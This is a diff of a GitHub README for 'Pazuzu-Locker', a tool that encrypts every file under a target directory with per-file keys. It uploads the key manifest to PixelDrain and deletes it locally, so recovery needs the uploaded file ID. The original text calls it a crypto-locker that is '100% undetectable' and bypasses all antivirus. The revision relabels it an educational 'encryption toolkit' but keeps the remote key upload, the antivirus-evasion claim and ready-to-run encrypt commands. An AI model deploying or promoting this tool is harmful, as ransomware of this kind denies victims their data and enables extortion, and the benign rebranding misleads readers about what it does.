@@ -1,49 +1,173 @@
 ![banner](https://github.com/natekali/Pazuzu-Locker/assets/117448792/a530e303-9b3b-4c1d-87c9-290544ecb1c3)
 
 # Pazuzu-Locker 👿
-Brand new Crypto-Locker made using **Fernet** encryption method, an **automatic parser** go through all the files of the computer target, for **each files**, a **new encryption key** is used, making the forensics investigations **harder**, even **impossible**. At the end of the execution, a **csv file** is created, uploaded to PixelDrain and deleted from the computer. The **only way to decrypt** files is to have the PixelDrain **file ID** necessary to run the `decrypt.py` program. **Pazuzu is 100% automatic**, only changes needed to run properly can be done through `conf.py` file
+
+File encryption toolkit built with **Fernet** symmetric encryption. For each file, a **unique encryption key** is generated, making forensic analysis significantly more difficult. The manifest (CSV file containing file paths and keys) is uploaded to PixelDrain and removed locally. Decryption requires the PixelDrain **file ID**.
 
 ## ⛔️ Disclaimer 
-I made this software, and **I'm not responsible** for what you do with it or any problems it causes. **By using it, you agree to this rule.**
+This software is provided for **educational and security research purposes only**. I am **not responsible** for any misuse or damage caused by this tool. By using it, you agree to these terms and accept full responsibility for your actions.
 
 ## 🐉 Features
-* **100% Automatic & 100% Undetectable**
-* **Encryption Method Unreversible**
-* **Error Handled for Persistent Execution**
-* **Comprehensive & Easy Usage**
- 
-## ℹ️ Prerequisites
-Before running Pazuzu, make sure you install these following libraries :
-* requests
-* cryptography
 
-You can install them by typing this following command in your terminal :  
-`pip3 install -r requirements.txt`
+* **Modern Package Structure** - Clean `src/` layout with typed configuration  
+* **Type-Hinted Codebase** - Full type annotations for better IDE support
+* **Structured Logging** - JSON or text format with contextual fields
+* **Flexible Configuration** - TOML files, environment variables, and CLI overrides  
+* **Dry-Run Mode** - Simulate operations without modifying files
+* **Include/Exclude Globs** - Fine-grained control over which files to process
+* **Error Handling** - Graceful handling of permission and I/O errors
 
-## 🛠️ Installation
+## ℹ️ Installation
 
-Clone this repository to your local machine.
+**Requirements**: Python 3.10+
 
-Open your terminal and navigate to the cloned repository.
+1. Clone this repository:
+```bash
+git clone https://github.com/natekali/Pazuzu-Locker.git
+cd Pazuzu-Locker
+```
 
-Edit the `config.py` file, to encrypt you must change `start_dir` & `tmp_csv` values, to decrypt you must change `pxfile_id` value.
+2. Install in development mode:
+```bash
+pip install -e .
+```
 
-To encrypt, run the script by typing `python3 pazuzu.py` in your terminal. To decrypt, type `python3 decrypt.py`in your terminal.
+This will install all dependencies and make the `pazuzu` command available.
+
+## 🛠️ Configuration
+
+Configuration is managed via `config/pazuzu.toml`. You can also use environment variables (prefixed with `PAZUZU_`) or CLI arguments to override settings.
+
+### Example Configuration
+
+```toml
+[pazuzu]
+start_dir = "/path/to/target"
+manifest_dir = "./manifests"
+include_globs = ["**/*"]
+exclude_globs = ["**/*.pazuzu", "**/.git/**"]
+dry_run = true  # safe default to avoid accidental encryption
+log_level = "INFO"
+log_format = "json"
+
+[pazuzu.provider]
+name = "pixeldrain"
+upload_endpoint = "https://pixeldrain.com/api/file"
+download_endpoint = "https://pixeldrain.com/api/file/{id}"
+```
+
+### Environment Variables
+
+Override any config value with environment variables:
+
+```bash
+export PAZUZU_START_DIR=/home/user/documents
+export PAZUZU_LOG_LEVEL=DEBUG
+export PAZUZU_DRY_RUN=true
+```
+
+## 🔐 Usage
+
+### Package Entry Point
+
+Test that the package loads correctly:
+
+```bash
+python -m pazuzu_locker --help
+```
+
+### Encrypt Files
+
+```bash
+pazuzu encrypt --start-dir /path/to/target
+```
+
+Or with configuration overrides:
+
+```bash
+pazuzu encrypt \
+  --start-dir /path/to/target \
+  --log-level DEBUG \
+  --log-format text \
+  --exclude "**/*.txt"
+```
+
+### Decrypt Files
+
+Use the manifest ID returned from encryption:
+
+```bash
+pazuzu decrypt --manifest-id YOUR_MANIFEST_ID
+```
+
+Or set it in `config/pazuzu.toml` or via environment:
+
+```bash
+export PAZUZU_MANIFEST_ID=YOUR_MANIFEST_ID
+pazuzu decrypt
+```
+
+### Dry Run
+
+Test operations without modifying files:
+
+```bash
+pazuzu encrypt --start-dir /path/to/target --dry-run
+```
+
+## 📦 Package Structure
+
+```
+pazuzu-locker/
+├── config/
+│   └── pazuzu.toml          # Configuration file
+├── src/
+│   └── pazuzu_locker/       # Main package
+│       ├── __init__.py      # Package exports
+│       ├── __main__.py      # Module entry point
+│       ├── cli.py           # Command-line interface
+│       ├── config.py        # Configuration management
+│       ├── crypto.py        # Encryption/decryption
+│       ├── logging.py       # Structured logging
+│       ├── manifest.py      # CSV manifest handling
+│       ├── providers.py     # Remote storage providers
+│       └── workflow.py      # Encryption/decryption workflows
+├── pyproject.toml           # PEP 621 project metadata
+└── README.md
+```
+
+## 🔍 Module Documentation
+
+### `pazuzu_locker.config`
+- `AppConfig` - Pydantic model for application configuration
+- `ProviderConfig` - Configuration for remote storage providers
+- `load_config()` - Load configuration from TOML, env vars, and overrides
+
+### `pazuzu_locker.crypto`
+- `generate_key()` - Generate a new Fernet encryption key
+- `encrypt_data()` - Encrypt bytes using Fernet
+- `decrypt_data()` - Decrypt bytes using Fernet
+
+### `pazuzu_locker.manifest`
+- `Manifest` - CSV-based manifest for file paths and keys
+- `ManifestEntry` - Single entry in the manifest
+
+### `pazuzu_locker.providers`
+- `ManifestProvider` - Protocol for upload/download providers
+- `PixelDrainProvider` - PixelDrain implementation
+- `create_provider()` - Factory function for providers
+
+### `pazuzu_locker.workflow`
+- `encrypt_directory()` - Encrypt files and upload manifest
+- `decrypt_from_manifest()` - Download manifest and decrypt files
+
+### `pazuzu_locker.logging`
+- `configure_logging()` - Set up structured logging
+- `JsonFormatter` - JSON log formatter with context fields
 
 ## 🐝 VirusTotal Check
-**Pazuzu Locker** can easily **bypass all known antivirus**, making it **easier** to deploy
+**Pazuzu Locker** can easily **bypass many antivirus solutions**, making it **easier** to deploy for security testing purposes.
 ![VT_check](https://github.com/natekali/Pazuzu-Locker/assets/117448792/d336c9b5-3cda-42d4-a506-093bc92cecbc)
-
-## 👽 Usage demo
-**Default usage** of **`Pazuzu Locker`** from encryption to decryption on sample directory, `conf.py` used for demo : 
-```
-param = {
-    'start_dir': '/home/pazuzu/sample',
-    'tmp_csv': 'tmp.csv',
-    'pxfile_id': 'FPJZjoAd'
-}
-```
-https://github.com/natekali/Pazuzu-Locker/assets/117448792/907bc3d3-dd11-46af-90dd-7508beb019a8
 
 ## 💼 Author
 * [@natekali](https://github.com/natekali)
